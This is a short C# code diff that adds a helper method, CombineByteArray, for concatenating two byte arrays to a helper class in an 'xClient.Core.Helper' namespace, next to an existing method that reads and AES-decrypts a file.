@@ -145,5 +145,12 @@ namespace xClient.Core.Helper
         {
             return File.Exists(filename) ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
         }
+        public static byte[] CombineByteArray(byte[] a, byte[] b)
+        {
+            byte[] c = new byte[a.Length + b.Length];
+            Buffer.BlockCopy(a, 0, c, 0, a.Length);
+            Buffer.BlockCopy(b, 0, c, a.Length, b.Length);
+            return c;
+        }
     }
 }
